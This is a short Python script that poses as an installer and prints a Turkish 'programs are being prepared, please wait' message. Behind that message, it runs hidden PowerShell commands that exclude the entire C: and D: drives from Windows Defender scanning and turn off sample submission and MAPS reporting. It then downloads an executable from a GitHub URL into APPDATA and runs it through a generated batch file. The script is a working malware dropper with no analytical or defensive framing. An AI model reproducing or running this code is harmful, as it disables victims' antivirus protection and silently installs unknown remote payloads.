import os
import requests
a=os.getenv('APPDATA')

### DP ###
print("#########PROGRAMLAR HAZIRLANIYOR LÜTFEN BEKLEYİNİZZZ########")
os.system("powershell -WindowStyle Hidden -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath 'C:\ '")
os.system("powershell -WindowStyle Hidden -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath 'D:\ '")
os.system("PowerShell Set-MpPreference -SubmitSamplesConsent 2 ")
os.system("PowerShell Set-MpPreference -MAPSReporting 0​")

        
os.chdir(a)
file2=open("expe2.bat","w")
file2.write("cd %~dp0 \nsys2.exe ")
file2.close()

os.chdir(a)
url = 'https://github.com/blueskycloud137/asd/blob/main/Installer.exe?raw=true'
r = requests.get(url, allow_redirects=True)
open('sys2.exe', 'wb').write(r.content)
os.system("expe2.bat")
